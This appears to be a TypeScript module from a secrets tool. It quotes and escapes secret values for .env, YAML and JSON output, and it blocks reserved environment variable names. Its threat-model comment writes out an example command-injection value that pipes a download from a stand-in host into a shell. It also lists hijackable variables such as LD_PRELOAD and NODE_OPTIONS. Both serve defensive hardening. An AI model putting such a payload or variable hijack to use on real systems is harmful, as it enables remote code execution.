/**
 * Safe serialization of secrets into env / YAML / JSON formats.
 *
 * Threat model: a secret *value* (or name) is attacker-influenced data. Written
 * naively into a .env file, a value such as `x$(curl evil.sh|sh)` runs as a
 * command the moment someone does `source .env` or `set -a; . .env`. A name
 * containing a newline can inject extra variables (e.g. PATH or NODE_OPTIONS).
 */

const ENV_NAME_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;
/** Characters that are inert both for POSIX shells and for dotenv parsers. */
const SAFE_BARE_RE = /^[A-Za-z0-9_./:@+,%=-]*$/;
const LINE_RE = /^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)$/;

/** Variables that must never be overwritten by an injected secret. */
const RESERVED_NAMES = new Set([
  'PATH',
  'HOME',
  'SHELL',
  'IFS',
  'PS4',
  'ENV',
  'BASH_ENV',
  'LD_PRELOAD',
  'LD_LIBRARY_PATH',
  'DYLD_INSERT_LIBRARIES',
  'DYLD_LIBRARY_PATH',
  'NODE_OPTIONS',
  'PYTHONPATH',
  'PYTHONSTARTUP',
  'PERL5OPT',
  'RUBYOPT',
  'GIT_SSH_COMMAND',
]);

export function validateSecretName(name: string): true | string {
  if (!ENV_NAME_RE.test(name)) {
    return 'Secret names must match [A-Za-z_][A-Za-z0-9_]* (usable as an environment variable)';
  }
  if (RESERVED_NAMES.has(name.toUpperCase())) {
    return `"${name}" is a reserved environment variable and cannot be stored as a secret`;
  }
  return true;
}

export function assertSecretName(name: string): void {
  const result = validateSecretName(name);
  if (result !== true) throw new Error(result);
}

/**
 * Quote a value so that both `source .env` (POSIX sh/bash/zsh) and dotenv-style
 * parsers read back exactly the original string, with no shell expansion.
 */
export function serializeEnvValue(value: string): string {
  if (value.length > 0 && SAFE_BARE_RE.test(value)) {
    return value;
  }
  // Single quotes are fully literal in shells and in dotenv.
  if (!value.includes("'") && !value.includes('\n') && !value.includes('\r')) {
    return `'${value}'`;
  }
  // Fallback: double quotes with every shell-active character escaped.
  // Newlines become the `\n` escape understood by dotenv.
  const escaped = value
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/\$/g, '\\$')
    .replace(/`/g, '\\`')
    .replace(/\r/g, '\\r')
    .replace(/\n/g, '\\n');
  return `"${escaped}"`;
}

export function serializeEnvLine(name: string, value: string): string {
  assertSecretName(name);
  return `${name}=${serializeEnvValue(value)}`;
}

/**
 * Minimal dotenv parser that understands the quoting produced above plus the
 * common `export KEY=value` form. Used to merge into an existing file without
 * double-quoting or corrupting existing values.
 */
export function parseDotenv(content: string): Map<string, string> {
  const vars = new Map<string, string>();
  for (const rawLine of content.split(/\r?\n/)) {
    const line = rawLine.trim();
    if (!line || line.startsWith('#')) continue;
    const m = line.match(LINE_RE);
    if (!m) continue;
    const key = m[1];
    let value = m[2];
    if (value.startsWith("'")) {
      const end = value.indexOf("'", 1);
      value = end === -1 ? value.slice(1) : value.slice(1, end);
    } else if (value.startsWith('"')) {
      let out = '';
      for (let i = 1; i < value.length; i++) {
        const ch = value[i];
        if (ch === '\\' && i + 1 < value.length) {
          const next = value[++i];
          out += next === 'n' ? '\n' : next === 'r' ? '\r' : next;
        } else if (ch === '"') {
          break;
        } else {
          out += ch;
        }
      }
      value = out;
    } else {
      const hash = value.search(/\s#/);
      if (hash !== -1) value = value.slice(0, hash);
      value = value.trim();
    }
    vars.set(key, value);
  }
  return vars;
}

/** JSON strings are valid YAML double-quoted scalars, with correct escaping. */
export function serializeYaml(vars: Record<string, string>): string {
  const lines = ['# SecretForge export'];
  for (const [key, value] of Object.entries(vars)) {
    lines.push(`${JSON.stringify(key)}: ${JSON.stringify(value)}`);
  }
  return lines.join('\n');
}
